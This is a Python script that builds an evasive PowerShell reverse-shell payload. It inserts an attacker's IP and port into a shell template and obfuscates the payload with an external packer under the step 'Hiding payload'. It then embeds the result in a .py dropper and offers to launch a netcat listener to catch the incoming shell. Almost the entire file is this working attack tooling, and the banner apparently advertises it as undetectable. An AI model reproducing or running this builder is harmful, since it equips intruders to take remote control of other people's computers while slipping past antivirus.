import os
import random
import platform
import argparse
import sys

parser = argparse.ArgumentParser()
parser.add_argument("-i","--ip", help="Your local IP",type=str,required=True)
parser.add_argument("-p","--port",help="Port to listen on",type=int,required=True)
parser.add_argument("-o","--output",help="Output folder for the .py file",required=False)
args = parser.parse_args()





banner = """
@@@@@@@@  @@@  @@@  @@@@@@@       @@@@@@   @@@  @@@  
@@@@@@@@  @@@  @@@  @@@@@@@@     @@@@@@@   @@@  @@@  
@@!       @@!  @@@  @@!  @@@     !@@       @@!  @@@  
!@!       !@!  @!@  !@!  @!@     !@!       !@!  @!@  
@!!!:!    @!@  !@!  @!@  !@!     !!@@!!    @!@!@!@!  
!!!!!:    !@!  !!!  !@!  !!!      !!@!!!   !!!@!!!!  
!!:       !!:  !!!  !!:  !!!          !:!  !!:  !!!  
:!:       :!:  !:!  :!:  !:!         !:!   :!:  !:!  
 ::       ::::: ::   :::: ::     :::: ::   ::   :::  
 :         : :  :   :: :  :      :: : :     :   : :  
                                                     Include FuckThatPacker.py from Inf0sec"""



ip = args.ip
port = args.port
key = random.randint(1,99)

print("[+] Generating Payload")
with open("template/shell.txt","r") as file:
	data = file.read()
	data = data.replace("%%ip%%",ip)
	data = data.replace("%%port%%",str(port))
with open("shell.ps1",'w') as file2:
	file2.write(data)

print("[+] Hiding payload")

os.system(f"python FuckThatPacker.py -k {key} -p shell.ps1 -o packed_shell.ps1")

with open("packed_shell.ps1","r") as file3:
	data2 = file3.read()
with open("template/py.txt","r") as file4:
	data3 = file4.read().replace("%%shell%%",data2)

print("[+] Writting payload into .py template")

if args.output:
	path = str(args.output)+"shell.py"
	try:
		with open(path,"w") as file5:
			file5.write(data3)
	except:
		print(f"[-] Can't save into folder {args.output}")
		sys.exit()
else:
	with open("shell.py","w") as file5:
		file5.write(data3)


os.remove("shell.ps1")
os.remove("packed_shell.ps1")

if platform.system() == "Windows":
	os.system("cls")
else:
	os.system("clear")


print(banner)
print(f"Ip      ---> {ip}")
print(f"Port    ---> {port}")
print(f"Payload ---> Powershell Reverse sh \n")


if input("Do you want to run Netcat ? (y/n):").upper()=="Y":
	os.system(f"nc -nvlp {port}")
else:
	print("[+] Ended, run netcat from your own :p")
